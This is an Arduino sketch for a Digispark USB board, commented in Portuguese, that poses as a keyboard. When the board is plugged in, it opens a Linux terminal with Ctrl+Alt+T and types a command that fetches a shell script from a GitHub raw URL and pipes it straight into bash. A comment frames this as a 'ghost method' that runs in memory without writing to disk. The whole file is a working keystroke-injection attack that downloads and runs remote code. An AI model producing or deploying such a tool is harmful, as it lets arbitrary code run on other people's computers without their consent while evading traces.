#include "DigiKeyboard.h"

void setup() {
  // Inicializa e "acorda" a conexão USB do computador
  DigiKeyboard.sendKeyStroke(0);
  DigiKeyboard.delay(3000);

  // Abre o terminal (CTRL+ALT+T - Ubuntu/Linux)
  DigiKeyboard.sendKeyStroke(KEY_T, MOD_CONTROL_LEFT | MOD_ALT_LEFT);
  DigiKeyboard.delay(5000);

  // MÉTODO FANTASMA: Baixa e executa direto da memória (não salva no HD)
  DigiKeyboard.println("wget -qO- https://raw.githubusercontent.com/fabiobrilhante/exemplo/main/mensagem.sh | bash");
}

void loop() {
  // Mantém a conexão USB viva, mas não faz nada
  DigiKeyboard.update();
  DigiKeyboard.delay(100);
}
